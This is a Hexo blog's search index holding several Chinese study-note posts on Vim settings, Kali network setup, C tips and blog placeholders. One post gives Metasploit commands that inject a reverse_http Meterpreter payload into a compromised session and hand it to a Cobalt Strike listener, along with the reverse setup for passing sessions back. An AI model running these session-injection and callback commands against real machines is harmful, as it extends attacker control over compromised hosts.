<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>测试密码访问</title>
    <url>/2024/09/09/example/test-passwd/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="9c29d2ae8c9408ebabfe5502d542763af69160ec81974d9abe486a1990c0affe">b7d6aa4f9b0e255d1a59a9e7f2b85d1b1ed944caf21c7e84e4e7408bbf88993cf0d430a5b6e273a1f7a43f8b32eac3de82b6eeb75f7c346696330f8d36f5692a27b30c478d7b56d48dc56572de233ad0130e4a303c4df72a9b15befccec21c02e2aee8df667ff0af8266638f6e91eb6a3bca9f45e4922c6488c20e619887cb0056428b759e3198e95d178adb6800981b0db62870df36f8b0da4a902b04d0e8a6ceee478426bcb36ac1e5b28ae924677481c37900a1de536d7efaa30eb218ef7f223fa63e35f0e1c354d920d7d66d0826589b951e4c6908266586755cf8f9cad0a22961a9c6178b098261f1393913ea36e8dd3cdaf6397b637cdc3d67c1ae5cfd403201d724a44cd364b76a4ef929d18f092b7fef6599a6793491e4d7d652bca7d80798504f5eb9ef3cdaf80f3ebcc23b0cf08d33e0ad7f7409b25bfd41104b9857be0e80a0e2089aea9fc7cd8dcaaeb8d0869460e91bedebc63c8e79916d498bab50676f513b39265bee8b113e4959f44ed3f26f0e91e21e3562751b6e630e5b93e64d69c5d3eaf9c3088c67c59713170f93d18d3d1ca720924fccd220caea295921dbcb25828a70e0948f12124c4995c8c91bbef13371aa993f48558f53d23bfb6859de37901a7215a4219876e9cdf076e340760604fff3a1f813762e132f6ebf866ae10b7d00ab9d795337e5cca897a58550889be251f1cb763a63aead731534794db2feb7da838808a864b7560602b9702ac2cd75230437c7aabf3eaa7178d2f053c482843b3512dbc29c56373ef0f2d94b217ac8b4d3a31f6cb6a104d4483f2da79a75e75d0b66ecc0652c4579d4de9f0c9035d270fccd8552e091cacaf453212de088d7e30e6dee84903441a54774e5f69ad6753498a66b405ed67fa6faff788fe48a27d913199d7f0bb2374c7ebebf999efa28c23e276f42eab52a149b148ae4fbd9a1d1d2ce4f160d26ab160195598371cbac8d56b1ddeafb1089a1a77252986eb69ad798915b056b473116bbf9fcd05009b444ccdeffffbd6b9427b7edc8381965716b9759f5abe789ed3daeca3fa03a06e05494cfd5e75abd767d49b166da24c3e1f1473b9e2038e31d3545745984dd5cca808379572584243128ce2e15ddbc5b85863a6c46c378056b847b577a2616abdccc1a07ee1e52a15dad9e9e747e18efda1be6f421ebbc8a3751d85c6ac4d69b9b18f292314caa2b2a197c75dca9f9e682c0ab35628d707350395c</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
<script data-swup-reload-script type="module">
import {initHBE} from "/js/plugins/hbe.js";
  console.log("hexo-blog-encrypt: loaded.");
    initHBE();
</script>
]]></content>
      <categories>
        <category>example</category>
      </categories>
      <tags>
        <tag>example</tag>
      </tags>
  </entry>
  <entry>
    <title>测试文章时效性</title>
    <url>/2024/09/09/example/%E6%B5%8B%E8%AF%95%E6%97%B6%E6%95%88%E6%80%A7/</url>
    <content><![CDATA[<h1 id="这是测试文字"><a href="#这是测试文字" class="headerlink" title="这是测试文字"></a>这是测试文字</h1><h2 id="这是测试文字-1"><a href="#这是测试文字-1" class="headerlink" title="这是测试文字"></a>这是测试文字</h2><h3 id="这是测试文字-2"><a href="#这是测试文字-2" class="headerlink" title="这是测试文字"></a>这是测试文字</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">这是测试文字</span><br></pre></td></tr></table></figure></div>

<p>这是测试文字</p>
]]></content>
      <categories>
        <category>example</category>
      </categories>
      <tags>
        <tag>example</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/09/09/example/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>example</category>
      </categories>
      <tags>
        <tag>example</tag>
      </tags>
  </entry>
  <entry>
    <title>云服务器</title>
    <url>/2024/09/10/%E5%A4%87%E5%BF%98%E5%BD%95/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="01623beed1f3152631c2404190b6f38ec45e5209015973c8234b812b3f302185">2c57a2851a68e9855f8788f6d6316468534e195ad74e87259f53b0c03bb99be47473a3f5f9e5e77c7fc153886505447ef95ba1bd306fe121bb7af72b2f151fe82083b308afa6edd9ad5ce1d9c755cfd176b9064c7f303d86dc65ef12eedeb23bcb2a5c88fe2baba53a67b1b7830cd243cd18dc10d2d19e3553e1ebee2a7aa63ec06a33ce56c2811fa97ec915d8b0228a04990e87e2b4e8504cbf1c1bb8a6056b1277c13a5515a0af51883ca0c09eae27608a5d5f7f1dbe54f8b358bc3720979fc1abc8e61f8e2b4061360ba191fe2abec8a119b1c51725c73c1a7817a3edbafe0a7f7fd2a23022cc11f79b0fc2fc430169b83ad498b6d47792c7edff4ad6eb52d680e5d318e91c91a754e71599631657f7c9e7d4b54d77b73a2ef3050e9df98a92068c863bebdd9de0c29b7b38cb6ddd72487e4081d782805d309c91e81466664a1d0c923ee6bb8bcabf8545dd8fda13de0fea1236d90ef8f80267f1fa8ca8ef953caec07faf4f1056bd1804b4c8aa1ccdc9c06980a0ccfa22ef6970211a9d56ed63dec6c95de3a9cf03eb83853b819a4060d8e92f9e3fd36840fd8e3ede22cd35a8800d4a38dcb81045f98c7b59f6e47d39f90754a887dc5b70f017382ff6040ab63a3a5663adb87ba6975176daa18251a8471bab979a737fa8517d3889f7b2af9d65c25b160056d99ec0728b3e4c742ae8c411f78a063f7a84bce14b4633141780db71813538e437ce3e16ecbe51375844ae6c9570b7516cf140904255c53a65fe7fb5c562a9b656038ead2c584e931e9cfb0b8abd01fbede4d66a441cc6f638a87ccbb4652ee8bd645402a0ab1c0214461bd3a306241f3ed0916af121f5e3</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
<script data-swup-reload-script type="module">
import {initHBE} from "/js/plugins/hbe.js";
  console.log("hexo-blog-encrypt: loaded.");
    initHBE();
</script>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统Tab键相关设置</title>
    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/centos-linux/Tab%E9%94%AE%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<h3 id="Tab键相关设置"><a href="#Tab键相关设置" class="headerlink" title="Tab键相关设置"></a>Tab键相关设置</h3><h4 id="修改Tab键一次为4个空格"><a href="#修改Tab键一次为4个空格" class="headerlink" title="修改Tab键一次为4个空格"></a>修改Tab键一次为4个空格</h4><h5 id="1-仅本次"><a href="#1-仅本次" class="headerlink" title="1.仅本次"></a>1.仅本次</h5><p><strong>只在本次开打vim编辑器时生效，若重新打开vim编辑器，则失效</strong></p>
<p>进入末行模式（ESC）<br>输入指令：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> tabstop=4</span><br></pre></td></tr></table></figure></div>

<h5 id="2-永久"><a href="#2-永久" class="headerlink" title="2.永久"></a>2.永久</h5><p><strong>要想每次打开vim编辑器都能生效</strong>，可以编辑 Vim 的配置文件 .vimrc，并添加配置来设置 Tab 键的宽度</p>
<p>打开.vimrc文件,若没有就手动创建一个即可</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.vimrc</span><br><span class="line"><span class="comment">#输入以下配置</span></span><br><span class="line"><span class="built_in">set</span> tabstop=4</span><br></pre></td></tr></table></figure></div>

<h4 id="修改vim编辑器可查看文件行数"><a href="#修改vim编辑器可查看文件行数" class="headerlink" title="修改vim编辑器可查看文件行数"></a>修改vim编辑器可查看文件行数</h4><p>打开.vimrc文件,若没有就手动创建一个即可</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.vimrc</span><br><span class="line"><span class="comment">#输入以下配置</span></span><br><span class="line"><span class="built_in">set</span> nu</span><br></pre></td></tr></table></figure></div>

<h4 id="使vim打开文件可自动缩进"><a href="#使vim打开文件可自动缩进" class="headerlink" title="使vim打开文件可自动缩进"></a>使vim打开文件可自动缩进</h4><p>打开.vimrc文件,若没有就手动创建一个即可</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> shiftwidth=4    <span class="comment">#缩进使用4个空格的宽度</span></span><br><span class="line"><span class="built_in">set</span> softtabstop=4   <span class="comment">#设置tab所占的列数，当输入tab时，设为4个空格的宽度</span></span><br><span class="line"><span class="built_in">set</span> expandtab       <span class="comment">#扩展tab为空格</span></span><br><span class="line"><span class="built_in">set</span> autoindent		<span class="comment">#设置自动缩进</span></span><br><span class="line"><span class="built_in">set</span> smartindent		<span class="comment">#设置智能缩进</span></span><br></pre></td></tr></table></figure></div>

<h4 id="vim暂时关闭缩进和注释自动缩进设置"><a href="#vim暂时关闭缩进和注释自动缩进设置" class="headerlink" title="vim暂时关闭缩进和注释自动缩进设置"></a>vim暂时关闭缩进和注释自动缩进设置</h4><p>VIM在粘贴代码时会自动缩进，把代码搞得一团糟糕，甚至可能因为某行的一个注释造成后面的代码全部被注释掉</p>
<h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> pastetoggle</span><br></pre></td></tr></table></figure></div>

<p>即可关闭自动缩进</p>
<p>或者设置为快捷键，最方便的方法就是在.vimrc中加一句：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> pastetoggle=</span><br></pre></td></tr></table></figure></div>

<p>以后在插入模式下，只要按<strong>F9</strong>键就可以切换自动缩进。</p>
<p>当需要自己手写代码的时候，进入<strong>insert模式</strong>，默认就是自动缩进了。</p>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">paste</span></span><br></pre></td></tr></table></figure></div>

<p>然后再进入插入模式粘贴，代码就不会被自动缩进。</p>
<p>敲代码的时候需要自动缩进，需要改回来:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> nopaste</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>操作系统</category>
        <category>linux(centos)</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Blog网络不稳定访问解决方法</title>
    <url>/2024/09/12/%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85%E7%BD%91%E9%A1%B5/</url>
    <content><![CDATA[<h1 id="Blog慢访问问题"><a href="#Blog慢访问问题" class="headerlink" title="Blog慢访问问题"></a>Blog慢访问问题</h1><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><p>由于本博客是搭建在github pages上的，所以国内访问难免会有访问慢的时候，对此我在云服务器也搭建了一个同步的博客，方便加速访问</p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p><a class="link"   href="https://blogback.overlordzj.cn/" >点击这个国内链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>即可访问</p>
<p>或者通过主页右上角<code>link</code>菜单下的<code>domestic</code>进行访问</p>
<h2 id="残留问题"><a href="#残留问题" class="headerlink" title="残留问题"></a>残留问题</h2><p>不知道为什么搭建在云服务器的博客没有评论的功能，留一个小坑等之后有时间和能力了来填坑</p>
]]></content>
      <tags>
        <tag>待填坑</tag>
      </tags>
  </entry>
  <entry>
    <title>kali的IP配置</title>
    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/kali/IP%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="kali的IP配置"><a href="#kali的IP配置" class="headerlink" title="kali的IP配置"></a>kali的IP配置</h1><h2 id="静态IP"><a href="#静态IP" class="headerlink" title="静态IP"></a>静态IP</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/network/interfaces //进入ip修改环境</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/image-20240913223421712.png"
                      alt="image-20240913223421712"
                ></p>
<p>在这两行下面输入</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.1.111	//根据自身ip地址自定义</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.1.1		//根据自身ip网关自定义</span><br><span class="line">//退出并保存（:wq）</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/image-20240913223524009.png"
                      alt="image-20240913223524009"
                ></p>
<blockquote>
<p>说明</p>
</blockquote>
<p><strong>address表示自身要自定义的ip地址</strong><br><strong>netmask表示网关的子网掩码</strong><br><strong>gateway表示网关ip</strong></p>
<p>以上可以通过<code>ifconfig</code>查看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/image-20240913223931352.png"
                      alt="image-20240913223931352"
                ></p>
<p>下一步修改DNS解析，将默认的删掉改为如下设置</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/resolv.conf //修改DNS解析文件</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>119.29.29.29是腾讯的公共DNS</p>
<p>223.5.5.5是阿里的公共DNS</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/image-20240913224115739.png"
                      alt="image-20240913224115739"
                ></p>
<p>配置完IP信息后，重启Kali的网络服务，让网络配置生效</p>
<p>重启网络服务之前需要关闭<code>NetworkManager</code>，并且禁止该服务开机自启</p>
<blockquote>
<p>注:关闭NetworkManager服务,该服务是网络服务的图形管理工具,该服务会自动接管networking服务,有可能造成重启networking服务时配置不生效的问题</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop NetworkManager</span><br><span class="line">systemctl <span class="built_in">disable</span> NetworkManager</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/68920a80a0c29dd26f032a02a72a1f3e.png"
                      alt="68920a80a0c29dd26f032a02a72a1f3e"
                ></p>
<p>再重启Kali网络服务</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart networking</span><br></pre></td></tr></table></figure></div>

<p>查看IP配置是否成功</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig eth0</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/image-20240913224341195.png"
                      alt="image-20240913224341195"
                ></p>
<blockquote>
<p>因为我本身就是静态Ip所以没有变化</p>
</blockquote>
<p>IP地址没有变化，如果是首次更改IP配置，然后重启网络服务，IP 地址没生效属于正常情况，再重启一次就行</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart networking</span><br></pre></td></tr></table></figure></div>

<h2 id="动态IP"><a href="#动态IP" class="headerlink" title="动态IP"></a>动态IP</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/network/interfaces #进入ip修改环境</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/image-20240913223421712.png"
                      alt="image-20240913223421712"
                ></p>
<p>指定网卡并添加 <code>IP</code> 获取方式为 <code>DHCP</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/image-20240913224612463.png"
                      alt="image-20240913224612463"
                ></p>
<p>重启Kali网络服务</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart networking</span><br></pre></td></tr></table></figure></div>

<p>查看IP配置是否成功</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig eth0</span><br></pre></td></tr></table></figure></div>

<p>IP地址没有变化，如果是首次更改IP配置，然后重启网络服务，IP 地址没生效属于正常情况，再重启一次就行</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart networking</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>操作系统</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>msf与cs派生会话</title>
    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/kali/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/</url>
    <content><![CDATA[<h1 id="msf与cs派生会话"><a href="#msf与cs派生会话" class="headerlink" title="msf与cs派生会话"></a>msf与cs派生会话</h1><h2 id="MSF转CS"><a href="#MSF转CS" class="headerlink" title="MSF转CS"></a>MSF转CS</h2><h3 id="在CS中做好接口监听端口的准备"><a href="#在CS中做好接口监听端口的准备" class="headerlink" title="在CS中做好接口监听端口的准备"></a>在CS中做好接口监听端口的准备</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914010145920.png"
                      alt="image-20240914010145920"
                ></p>
<h3 id="在MSF中添加转接exploit"><a href="#在MSF中添加转接exploit" class="headerlink" title="在MSF中添加转接exploit"></a>在MSF中添加转接exploit</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">background                // 挂起会话</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http	//payload各不相同，注意不要设置错了，这是32位的</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.16.181     //设置 CS 服务端的 IP 地址.</span><br><span class="line"><span class="built_in">set</span> lport 4400              //设置 CS 服务端的监听的端口</span><br><span class="line"><span class="built_in">set</span> pid xxxx	//设置程序的pid（可以不管，会自动生成一个）</span><br><span class="line"><span class="built_in">set</span> DisablePayloadHandler True</span><br><span class="line"><span class="built_in">set</span> PrependMigrate True</span><br><span class="line">sessions -l  //查看 会话 是多少则设置多少</span><br><span class="line"><span class="built_in">set</span> session 1 [一般是 1(上面查看的结果)]</span><br><span class="line">exploit      // 进行测试</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914010307684.png"
                      alt="image-20240914010307684"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914010406568.png"
                      alt="image-20240914010406568"
                ></p>
<p>下面这个就是我们转接过去的beacon</p>
<h2 id="CS转MSF"><a href="#CS转MSF" class="headerlink" title="CS转MSF"></a>CS转MSF</h2><h3 id="在MSF中做好接口监听端口的准备"><a href="#在MSF中做好接口监听端口的准备" class="headerlink" title="在MSF中做好接口监听端口的准备"></a>在MSF中做好接口监听端口的准备</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914003204778.png"
                      alt="image-20240914003204778"
                ></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http	//这里要设置好，协议要与下面CS的协议用一样</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.0.1</span><br><span class="line"><span class="built_in">set</span> lport 4445	//用于接收cs的派生会话</span><br><span class="line">run	//或者exploit</span><br></pre></td></tr></table></figure></div>

<h3 id="在CS中添加新监听"><a href="#在CS中添加新监听" class="headerlink" title="在CS中添加新监听"></a>在CS中添加新监听</h3><h4 id="添加payload为Foreign-HTTP，端口为MSF正在监听的端口"><a href="#添加payload为Foreign-HTTP，端口为MSF正在监听的端口" class="headerlink" title="添加payload为Foreign HTTP，端口为MSF正在监听的端口"></a>添加payload为Foreign HTTP，端口为MSF正在监听的端口</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240913230933632.png"
                      alt="image-20240913230933632"
                ></p>
<h4 id="在beacon会话中运行"><a href="#在beacon会话中运行" class="headerlink" title="在beacon会话中运行"></a>在beacon会话中运行</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">spawn 监听器名</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914004900523.png"
                      alt="image-20240914004900523"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914004917729.png"
                      alt="image-20240914004917729"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914005102622.png"
                      alt="image-20240914005102622"
                ></p>
<h4 id="或者在右键菜单中找到spawn进行派生会话"><a href="#或者在右键菜单中找到spawn进行派生会话" class="headerlink" title="或者在右键菜单中找到spawn进行派生会话"></a>或者在右键菜单中找到spawn进行派生会话</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240913220809576.png"
                      alt="image-20240913220809576"
                ></p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言的一些代码小技巧</title>
    <url>/2024/09/11/C%E8%AF%AD%E8%A8%80/%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86/%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h1 id="C语言中的代码小技巧"><a href="#C语言中的代码小技巧" class="headerlink" title="C语言中的代码小技巧"></a>C语言中的代码小技巧</h1><h2 id="1、输出一个回车符号"><a href="#1、输出一个回车符号" class="headerlink" title="1、输出一个回车符号"></a>1、输出一个回车符号</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);	<span class="comment">//表示输出一个回车符号</span></span><br></pre></td></tr></table></figure></div>

<p>putchar()函数表示直接输出一个字符，（）内可以填写一个字符；也可以填写其ASCII码（一个整数），然后系统将其转化为字符输出</p>
<p>而ASCII中的10对应的是line feed(换行)，所以改语句才实现了换行功能</p>
<p>当然也可以直接</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>或者</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>();</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>解释</p>
</blockquote>
<p>putchar();输出的是字符，但不自带换行功能。</p>
<p>puts();自带换行功能，将结尾\0换成\n。</p>
<hr>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>C语言</category>
        <category>基础部分</category>
      </categories>
      <tags>
        <tag>C语言</tag>
        <tag>技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>关于C语言学习的部分遗漏问题解答</title>
    <url>/2024/09/10/C%E8%AF%AD%E8%A8%80/%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/</url>
    <content><![CDATA[<h1 id="遗漏问题解答"><a href="#遗漏问题解答" class="headerlink" title="遗漏问题解答"></a>遗漏问题解答</h1><p><a href="#%E6%B5%AE%E7%82%B9%E6%95%B0%E7%9A%84%E6%95%B0%E5%80%BC%E8%8C%83%E5%9B%B4">浮点数的数值范围</a></p>
<p><a href="#%E8%B5%8B%E5%80%BC%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%8E%E8%B5%8B%E5%80%BC%E8%AF%AD%E5%8F%A5">赋值表达式与赋值语句</a></p>
